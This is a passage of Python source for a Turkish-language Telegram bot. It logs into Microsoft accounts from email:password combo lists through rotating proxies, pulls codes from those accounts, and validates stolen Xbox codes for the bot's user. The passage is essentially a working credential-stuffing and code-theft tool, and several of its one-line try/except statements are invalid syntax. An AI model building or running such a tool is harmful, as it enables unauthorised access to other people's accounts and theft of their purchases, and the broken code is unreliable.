            bot.send_message(chat_id, "❌ Gerekli veri dosyaları eksik!")
            return
            
        bot.edit_message_text(f"⏳ {len(checker_lines)} Checker hesabına giriş yapılıyor...", chat_id, status_msg.message_id)
        session_pool = []
        for line in checker_lines:
            c_email, c_pass = line.split(':', 1)
            px = get_random_proxy(u_data['proxies']) if u_data['proxies'] else None
            sess = login_microsoft_account(c_email, c_pass, px)
            if sess:
                session_pool.append({'session': sess, 'email': c_email})
                
        if not session_pool:
            bot.send_message(chat_id, "❌ Checker hesapları doğrulanamadı. Combo iptal.")
            return

        # Phase 2: Fetching
        u_data['stats']['total'] = len(acc_lines)
        tracker_t = threading.Thread(target=live_results_tracker, args=(chat_id, status_msg.message_id, u_data, stop_event, "FETCH"))
        tracker_t.start()
        
        fetched_codes = []
        with ThreadPoolExecutor(max_workers=FETCH_THREADS) as executor:
            futures = []
            for line in acc_lines:
                email, password = line.split(':', 1)
                futures.append(executor.submit(fetch_account_worker_tg, email, password, u_data, fetched_codes))
            for future in as_completed(futures):
                pass
                
        stop_event.set()
        tracker_t.join()
        
        fetched_codes = list(set(fetched_codes))
        if not fetched_codes:
            bot.send_message(chat_id, "⚠️ Hesaplardan hiç kod çekilemedi, Validation evresine geçilemiyor.")
            return
            
        # Phase 3: Validation
        bot.send_message(chat_id, f"➔ Toplam {len(fetched_codes)} kod doğrulama evresine gönderiliyor...")
        u_data['stats'] = {k: 0 for k in u_data['stats']} # İstatistik sıfırla
        u_data['stats']['total'] = len(fetched_codes)
        
        stop_event = threading.Event()
        tracker_t = threading.Thread(target=live_results_tracker, args=(chat_id, status_msg.message_id, u_data, stop_event, "VALIDATE"))
        tracker_t.start()
        
        results = {"valid": [], "redeemed": [], "invalid": [], "error": []}
        prepare_redeem_executor = ThreadPoolExecutor(max_workers=VALIDATE_THREADS * 2)
        
        with ThreadPoolExecutor(max_workers=VALIDATE_THREADS) as executor:
            futures = []
            for code in fetched_codes:
                futures.append(executor.submit(validate_code_worker_tg, code, u_data, session_pool, results, prepare_redeem_executor))
            for future in as_completed(futures):
                pass
                
        prepare_redeem_executor.shutdown(wait=False)
        stop_event.set()
        tracker_t.join()
        
        send_tg_results(chat_id, user_id, results, len(fetched_codes))

    # Temizlik
    try: os.remove(u_data['acc_file_path']) except: pass
    try: os.remove(u_data['codes_file_path']) except: pass
    try: os.remove(u_data['checker_acc_file_path']) except: pass
    u_data['status'] = 'idle'


def send_tg_results(chat_id, user_id, results, total_codes):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # Valid Dosyası
    if results["valid"]:
        v_name = f"tmp/valid_codes_{user_id}_{timestamp}.txt"
        with open(v_name, "w", encoding="utf-8") as f:
            for code, game in results["valid"]:
                f.write(f"{code} | {game}\n")
        with open(v_name, "rb") as f:
            bot.send_document(chat_id, f, caption="✅ Aktif/Geçerli Kodlar")
        try: os.remove(v_name) except: pass
                
    # Summary Oluşturma
    game_groups = {}
    for code, game_name in results["valid"]:
        if game_name not in game_groups:
            game_groups[game_name] = []
        game_groups[game_name].append(code)
        
    lines = []
    lines.append("=" * 45)
    lines.append(f"📦 XBOX CODES VALIDATION RESULT")
    lines.append("=" * 45)
    lines.append("")
    
    for game_name, codes_list in sorted(game_groups.items()):
        lines.append(f"🎮 {game_name} ({len(codes_list)} Codes)")
        lines.append("-" * 45)
        codes_list.sort()
        code_counts = {}
        for code in codes_list:
            code_counts[code] = code_counts.get(code, 0) + 1
        for code, count in sorted(code_counts.items()):
            if count == 1:
                lines.append(f"{code}")
            else:
                lines.append(f"{code} (x{count})")
        lines.append("")
        
    lines.append("📊 SUMMARY")
    lines.append("=" * 45)
    lines.append(f"Total processed codes: {total_codes}")
    lines.append(f"Valid active codes   : {len(results['valid'])}")
    lines.append(f"Redeemed codes       : {len(results['redeemed'])}")
    lines.append(f"Invalid codes        : {len(results['invalid'])}")
    lines.append(f"Error/Failed codes   : {len(results['error'])}")
    lines.append("=" * 45)
    lines.append("\n⚙️ Yetkili: @vantrexXxx")
    
    summary_text = "\n".join(lines)
    
    s_name = f"tmp/validation_summary_{user_id}_{timestamp}.txt"
    with open(s_name, "w", encoding="utf-8") as f:
        f.write(summary_text)
    with open(s_name, "rb") as f:
        bot.send_document(chat_id, f, caption="📊 İşlem Özeti ve Raporu")
    try: os.remove(s_name) except: pass
    
    bot.send_message(chat_id, "🎉 *Tüm işlemler bitti! Yeni bir işlem için /menu yazabilirsiniz.*", parse_mode="Markdown")

if __name__ == '__main__':
    print("🤖 Telegram Bot başlatılıyor... Yetkili: @vantrexXxx")
    bot.infinity_polling()

